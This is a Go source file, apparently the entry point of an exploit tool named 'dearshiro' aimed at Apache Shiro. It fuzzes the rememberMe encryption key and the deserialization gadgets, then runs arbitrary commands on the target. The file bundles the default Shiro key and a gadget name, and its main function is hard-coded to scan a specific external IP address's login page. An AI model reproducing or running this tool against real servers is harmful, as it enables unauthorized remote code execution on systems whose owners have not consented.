package main

import (
	"DearShiro_GO/core/exec"
	"DearShiro_GO/core/scanner"
	"fmt"
	cli "github.com/jawher/mow.cli"
	"net/url"
	"os"
)

var (
	targetUrlRaw string
	key          string
	gadget       string
	command      string
)

func cmdKeyFuzz(cmd *cli.Cmd) {
	cmd.Spec = "URL"

	cmd.StringArgPtr(&targetUrlRaw, "URL", "", "The target shiro url")

	cmd.Action = func() {
		targetUrl, err := url.Parse(targetUrlRaw)

		if err != nil {
			fmt.Fprintf(os.Stderr, "url parse error: %s", targetUrlRaw)
			return
		}

		s := &scanner.KeyScanner{TargetUrl: targetUrl}
		s.Scan()
	}
}

func cmdGadgetFuzz(cmd *cli.Cmd) {
	cmd.Spec = "URL [-k]"

	cmd.StringArgPtr(&targetUrlRaw, "URL", "", "The target shiro url")
	cmd.StringOptPtr(&key, "k key", "kPH+bIxk5D2deZiIxcaaaA==", "The target shiro key")

	cmd.Action = func() {
		targetUrl, err := url.Parse(targetUrlRaw)

		if err != nil {
			fmt.Fprintf(os.Stderr, "url parse error: %s", targetUrlRaw)
			return
		}

		s := &scanner.GadgetScanner{TargetUrl: targetUrl, TargetShiroKey: key}
		s.Scan()
	}
}

func cmdCommandExec(cmd *cli.Cmd) {
	cmd.Spec = "URL [-k] [-g] -c"

	cmd.StringArgPtr(&targetUrlRaw, "URL", "", "The target shiro url")
	cmd.StringOptPtr(&key, "k key", "kPH+bIxk5D2deZiIxcaaaA==", "The target shiro key")
	cmd.StringOptPtr(&gadget, "g gadget", "CCK1", "The serial gadget")
	cmd.StringOptPtr(&command, "c command", "", "The command want to execute")

	cmd.Action = func() {
		targetUrl, err := url.Parse(targetUrlRaw)

		if err != nil {
			fmt.Fprintf(os.Stderr, "url parse error: %s", targetUrlRaw)
			return
		}

		e := &exec.CommandExecutor{TargetUrl: targetUrl, TargetShiroKey: key, Gadget: gadget}
		e.Exec(command)
	}
}

func main() {
	app := cli.App("dearshiro", "A simple scanner for shiro")

	app.Command("kfuzz", "To Fuzz the shiro key", cmdKeyFuzz)
	app.Command("gfuzz", "To Fuzz the avaliable gadget", cmdGadgetFuzz)
	app.Command("cexec", "To execute the command", cmdCommandExec)

	args := []string{"dearshiro", "kfuzz", "http://123.60.26.60:32767/login"}
	app.Run(args)
	//app.Run(os.Args)
}
